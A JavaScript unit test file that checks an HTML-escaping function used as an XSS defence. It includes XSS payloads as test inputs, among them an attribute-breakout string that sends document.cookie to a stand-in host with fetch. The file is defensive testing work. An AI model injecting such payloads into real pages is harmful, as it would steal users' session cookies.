import { describe, it, expect } from 'vitest';
import { escapeHtml } from '../src/js/utils.js';

// Characterization test: escapeHtml() is now the primary XSS defense relied
// on by room-label-html.js, section-nav-html.js, admin-templates.js and
// cart-line-html.js (added while fixing /cso Findings #2 and #3). It had no
// dedicated test before despite being pervasively depended on.

describe('escapeHtml', () => {
  it('escapes the five reserved HTML characters', () => {
    expect(escapeHtml(`<img src=x onerror="alert(1)">&'`)).toBe(
      '&lt;img src=x onerror=&quot;alert(1)&quot;&gt;&amp;&#039;'
    );
  });

  it('neutralizes an attribute-breakout payload', () => {
    const payload = `x" onload="fetch('//evil.example/c?'+document.cookie)`;
    expect(escapeHtml(payload)).not.toContain('" onload="');
  });

  it('returns an empty string for null/undefined', () => {
    expect(escapeHtml(null)).toBe('');
    expect(escapeHtml(undefined)).toBe('');
  });

  it('leaves plain text untouched', () => {
    expect(escapeHtml('طقم كنب زاوية مودرن')).toBe('طقم كنب زاوية مودرن');
  });
});
